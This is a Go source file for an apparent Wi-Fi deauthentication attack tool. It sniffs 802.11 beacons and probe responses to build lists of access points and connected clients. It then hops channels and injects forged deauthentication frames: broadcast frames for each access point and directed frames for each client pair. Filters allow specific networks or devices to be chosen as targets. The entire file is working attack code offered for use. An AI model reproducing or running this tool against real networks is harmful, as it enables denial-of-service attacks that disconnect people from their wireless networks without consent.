package core

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var noiseList []string = []string{"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "33:33:00:", "33:33:ff:", "01:80:c2:00:00:00", "01:00:5e:"}

type AP struct {
	SSID    string
	BSSID   net.HardwareAddr
	Channel byte
}

type Client struct {
	Addr1     net.HardwareAddr
	Addr2     net.HardwareAddr
	APSSID    string
	APChannel byte
}

type APManager struct {
	APMutex sync.Mutex
	APMap   map[string]AP

	ClientMutex sync.Mutex
	ClientsMap  map[string]Client

	DefaultChannel byte
	MaxChannels    int
	MonIface       string
	BroadcastMac   net.HardwareAddr
	WriteHandle    *pcap.Handle

	IncludeAPs     []string
	IncludeClients []string
}

func NewAPManager(monIface string, handle *pcap.Handle, env *CLIArgs) *APManager {
	bMac := []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	bAddr := net.HardwareAddr(bMac)

	return &APManager{
		APMutex:        sync.Mutex{},
		ClientMutex:    sync.Mutex{},
		APMap:          make(map[string]AP),
		ClientsMap:     make(map[string]Client),
		DefaultChannel: 6,
		MaxChannels:    10,
		MonIface:       monIface,
		BroadcastMac:   bAddr,
		WriteHandle:    handle,

		IncludeAPs:     env.FilteredAPs,
		IncludeClients: env.FilteredClients,
	}
}

func (a *APManager) shouldIncludeAP(addr string) bool {
	if len(a.IncludeAPs) == 0 {
		return true
	}

	// is this address in the AP?
	for _, target := range a.IncludeAPs {
		if addr == target {
			return true
		}
	}

	return false
}

func (a *APManager) shouldIncludeClient(addr string) bool {
	if len(a.IncludeClients) == 0 {
		return true
	}

	// is this address in the AP?
	for _, target := range a.IncludeClients {
		if addr == target {
			return true
		}
	}

	return false
}

func (a *APManager) createPacket(addr1 net.HardwareAddr, addr2 net.HardwareAddr, addr3 net.HardwareAddr, seq uint16) []byte {
	var serOptions = gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(
		buf, serOptions,
		&layers.RadioTap{},
		&layers.Dot11{
			Address1:       addr1,
			Address2:       addr2,
			Address3:       addr3,
			Type:           layers.Dot11TypeMgmtDeauthentication,
			SequenceNumber: seq,
		},
		&layers.Dot11MgmtDeauthentication{
			Reason: layers.Dot11ReasonClass2FromNonAuth,
		},
	)

	if err != nil {
		log.Fatalf("failed to serialize deauth packet: %s", err.Error())
	}

	return buf.Bytes()
}

func (a *APManager) deauth(ch byte) {

	if len(a.APMap) == 0 && len(a.ClientsMap) == 0 {
		log.Println("no APs and client devices to attack")
	}

	allPackets := make([][]byte, 0)

	if len(a.ClientsMap) > 0 {
		a.ClientMutex.Lock()

		for clientKey := range a.ClientsMap {
			client := a.ClientsMap[clientKey]
			if ch == client.APChannel {
				log.Printf("directing attack at addr1=%s, add2=%s AP=%s", client.Addr1, client.Addr2, client.APSSID)
				pack1 := a.createPacket(client.Addr1, client.Addr2, client.Addr2, uint16(0))
				pack2 := a.createPacket(client.Addr2, client.Addr1, client.Addr1, uint16(0))
				allPackets = append(allPackets, pack1, pack2)

				delete(a.ClientsMap, clientKey)
			}
		}

		// clear this list:

		a.ClientMutex.Unlock()
	}

	if len(a.APMap) > 0 {
		a.APMutex.Lock()

		for apKey := range a.APMap {
			ap := a.APMap[apKey]
			if ch == ap.Channel {
				log.Printf("broadcasting attack at AP=%s", ap.SSID)
				for i := 0; i < 32; i++ {
					pack1 := a.createPacket(a.BroadcastMac, ap.BSSID, ap.BSSID, uint16(i))
					allPackets = append(allPackets, pack1)
				}
			}

			delete(a.APMap, apKey)
		}

		a.APMutex.Unlock()
	}

	log.Printf("sending %d packets", len(allPackets))
	for _, packet := range allPackets {
		a.WriteHandle.WritePacketData(packet)
		time.Sleep(10 * time.Millisecond)
	}
}

func (a *APManager) startAttack() {
	// iterate over all the channels:
	// for the first time, it just dry runs
	dryRun := true
	currentAttackChannel := 0
	for {

		currentAttackChannel = (currentAttackChannel + 1) % a.MaxChannels
		if currentAttackChannel == 0 {
			if dryRun {
				log.Println("finished dry-run, starting attack...")
				dryRun = false
			}
			currentAttackChannel = 1
		}

		// use this channel
		_, iError := ExecCommand("iwconfig", a.MonIface, "channel", fmt.Sprintf("%d", currentAttackChannel))
		if iError != nil {
			log.Fatalf("failed to set attack channel: %s", iError.Error())
			os.Exit(InterfaceCommandError)
		}

		if dryRun {
			time.Sleep(1 * time.Second)
		} else {
			time.Sleep(100 * time.Millisecond)
		}

		if !dryRun {
			log.Printf("launching attack from channel %d", currentAttackChannel)
			a.deauth(byte(currentAttackChannel))
		}
	}
}

func (a *APManager) isNoise(addr1 string, addr2 string) bool {
	for _, noiseAddr := range noiseList {
		if strings.Contains(addr1, noiseAddr) || strings.Contains(addr2, noiseAddr) {
			return true
		}
	}

	return false
}

func (a *APManager) addClient(addr1 net.HardwareAddr, addr2 net.HardwareAddr) {
	a.APMutex.Lock()
	defer a.APMutex.Unlock()

	a.ClientMutex.Lock()
	defer a.ClientMutex.Unlock()

	addr1Str := addr1.String()
	addr2Str := addr2.String()

	// should this client be included?
	if !a.shouldIncludeClient(addr1Str) && !a.shouldIncludeClient(addr2Str) {
		return
	}

	clKey := fmt.Sprintf("%s::%s", addr1Str, addr2Str)
	_, ok := a.ClientsMap[clKey]
	if ok {
		return
	}

	client := Client{Addr1: addr1, Addr2: addr2, APChannel: a.DefaultChannel}

	hasAP := false

	if ap, addr1Ok := a.APMap[addr1Str]; addr1Ok {
		client.APSSID = ap.SSID
		client.APChannel = ap.Channel
		hasAP = true
	} else if ap, addaddr2Ok := a.APMap[addr2Str]; addaddr2Ok {
		client.APSSID = ap.SSID
		client.APChannel = ap.Channel
		hasAP = true
	}

	// add this client
	if hasAP {
		a.ClientsMap[clKey] = client
		log.Printf(
			"added new client addr1=%s, addr2=%s, ap_bssid=%s, channel=%d",
			client.Addr1.String(), client.Addr2.String(), client.APSSID, client.APChannel,
		)
	}
}

func (a *APManager) addAPList(bssid net.HardwareAddr, packet gopacket.Packet) {

	a.APMutex.Lock()
	defer a.APMutex.Unlock()

	bssidStr := bssid.String()

	// should this BSSID be included?
	if !a.shouldIncludeAP(bssidStr) {
		return
	}

	// BSSID already in map?
	_, ok := a.APMap[bssidStr]
	if ok {
		return
	}

	ap := AP{}

	for _, layer := range packet.Layers() {
		parsedLayer, ok := layer.(*layers.Dot11InformationElement)
		if ok {
			if parsedLayer.ID == layers.Dot11InformationElementIDSSID {
				ssid := string(parsedLayer.Info)
				ap.SSID = ssid
			} else if parsedLayer.ID == layers.Dot11InformationElementIDDSSet {
				ap.Channel = byte(parsedLayer.Info[0])
			}
		}
	}

	ap.BSSID = bssid

	log.Printf("adding new AP with BSSID: %s, SSID: %s on channel: %d", bssidStr, ap.SSID, ap.Channel)
	a.APMap[bssidStr] = ap
}

func (a *APManager) CheckAndParseDot11(packet gopacket.Packet) {
	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer != nil {
		// we found a dot11 packet
		dot11Packet := dot11Layer.(*layers.Dot11)
		addr1 := dot11Packet.Address1
		addr2 := dot11Packet.Address2

		// is this access point already in the list?
		// the probe response originate from AP as a response to client probe
		// becons originate periodically from APs used for discovery purposes
		dot11Probe := packet.Layer(layers.LayerTypeDot11MgmtProbeResp)
		dot11Beacon := packet.Layer(layers.LayerTypeDot11MgmtBeacon)

		if dot11Probe != nil || dot11Beacon != nil {
			// get all necessary details:
			addr3 := dot11Packet.Address3
			a.addAPList(addr3, packet)
		}

		if a.isNoise(addr1.String(), addr2.String()) {
			return
		}

		a.addClient(addr1, addr2)
	}
}

var apManager *APManager = nil

func ListenForPacketsOnIface(iface *net.Interface, env *CLIArgs) *InternalError {
	readHandle, err := pcap.OpenLive(iface.Name, 1024, false, pcap.BlockForever)
	if err != nil {
		return &InternalError{
			Status:  PcapHandleError,
			Message: fmt.Sprintf("failed to open pcacp handle: %s", err.Error()),
		}
	}

	writeHandle, err := pcap.OpenLive(iface.Name, 1024, false, pcap.BlockForever)
	if err != nil {
		return &InternalError{
			Status:  PcapHandleError,
			Message: fmt.Sprintf("failed to open pcacp handle: %s", err.Error()),
		}
	}

	apManager = NewAPManager(iface.Name, writeHandle, env)
	log.Println("initialized Aaccess points manager")

	pcapSource := gopacket.NewPacketSource(readHandle, readHandle.LinkType())

	log.Printf("created pcap source, waiting for Dot11 packets on %s", iface.Name)
	go apManager.startAttack()
	for packet := range pcapSource.Packets() {
		apManager.CheckAndParseDot11(packet)
	}

	return nil
}
